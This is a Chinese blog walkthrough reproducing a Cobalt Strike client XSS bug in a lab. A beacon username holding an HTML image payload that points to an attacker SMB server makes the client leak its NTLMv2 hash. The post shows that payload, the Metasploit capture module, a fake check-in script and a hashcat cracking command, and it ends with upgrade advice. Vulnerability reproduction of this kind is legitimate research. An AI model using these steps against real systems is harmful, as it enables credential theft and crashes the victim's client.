## 漏洞简述

该漏洞存在于Cobalt
Strike的Beacon软件中，可能允许攻击者在Beacon配置中设置格式错误的用户名，触发XSS，从而导致在CS服务端上造成远程代码执行。

##  ** **前期准备****

环境信息：

192.168.101.11 kali

192.168.101.10 win10 （CS客户端）

复现漏洞之前建议先解读下奇安信攻防社区这篇文章：

https://forum.butian.net/share/708

CS伪造上线：

[
_https://github.com/LiAoRJ/CS_fakesubmit/blob/main/cs_fakesubmit.py.py_](https://github.com/LiAoRJ/CS_fakesubmit/blob/main/cs_fakesubmit.py.py)

[ _https://github.com/Sentinel-One/CobaltStrikeParser_](https://github.com/Sentinel-One/CobaltStrikeParser)

##  ** **利用过程****

先从web日志获取stage

![1664021218_632ef2e2638f6bf6a2007.png!small?1664021219609](https://image.3001.net/images/20220924/1664021218_632ef2e2638f6bf6a2007.png!small?1664021219609)

从stage中获取public key以及c2地址

> python3 parse_beacon_config.py --json

![1664021249_632ef30130b983f13f01a.png!small?1664021250001](https://image.3001.net/images/20220924/1664021249_632ef30130b983f13f01a.png!small?1664021250001)

将publickey放到文件Public_key.txt里

![1664021280_632ef3202ae2eaea57161.png!small?1664021280797](https://image.3001.net/images/20220924/1664021280_632ef3202ae2eaea57161.png!small?1664021280797)

User_name文件写kali地址

> Payload：<HTML><IMG SRC=file://192.168.101.11/a>

![1664021300_632ef3344aff12c938b10.png!small?1664021301071](https://image.3001.net/images/20220924/1664021300_632ef3344aff12c938b10.png!small?1664021301071)

Computer_name.txt和Process_name.txt随便写上几个就好了

接下来Kali msf监听

> auxiliary/server/capture/smb

只填地址就好

![1664021319_632ef3470e602dae02764.png!small?1664021319808](https://image.3001.net/images/20220924/1664021319_632ef3470e602dae02764.png!small?1664021319808)

然后开始伪造CS上线

> python3 cs_fakesubmit.py.py

写入你的C2地址，C2地址在获取public key那一步也有

次数尽量多吧，发送次数小的话有时候没有反应建议100左右，如果会卡顿几秒说明伪造上线成功了，反之就是次数不够或者其他原因吧，没遇到。

![1664021338_632ef35a0c4cd908ade48.png!small?1664021338756](https://image.3001.net/images/20220924/1664021338_632ef35a0c4cd908ade48.png!small?1664021338756)

卡顿2秒后，发现CS客户端出现图片渲染：

![](https://image.3001.net/images/20220924/1664032295_632f1e275283495973f28.png!small)  

同时kali获取到CS客户端所在机器的NTLMv2-SSP Hash

![1664021369_632ef379bc4ab4005cc2b.png!small?1664021370602](https://image.3001.net/images/20220924/1664021369_632ef379bc4ab4005cc2b.png!small?1664021370602)

这里会一直出来，因为在对伪造的SMB服务器不停的请求，同时CS客户端也被卡崩了，有点拒绝服务的意思,最后说下获取hash这里的原理吧：

大概就是SMB自动认证的机制，在windows中，只要对SMB服务器发起请求，就会携带
Hash进行认证，当然这可能是因为有个补丁没有打，只要在IE或者文件资源管理器访问smb服务器\\\ip就会出现认证信息：

![1664021387_632ef38b8336a0b4450b2.png!small?1664021388255](https://image.3001.net/images/20220924/1664021387_632ef38b8336a0b4450b2.png!small?1664021388255)

![1664021396_632ef39483767c3ef437b.png!small?1664021397164](https://image.3001.net/images/20220924/1664021396_632ef39483767c3ef437b.png!small?1664021397164)

NTLMv2-SSP Hash爆破可用hashcat，一般是很难成功的

> hashcat -m 5600 hash.txt pass.txt

## 修复措施

目前官方已发布安全版本修复上述漏洞，建议受影响的用户升级至安全版本。

参考链接：https://www.cobaltstrike.com/blog/out-of-band-update-cobalt-strike-4-7-1/

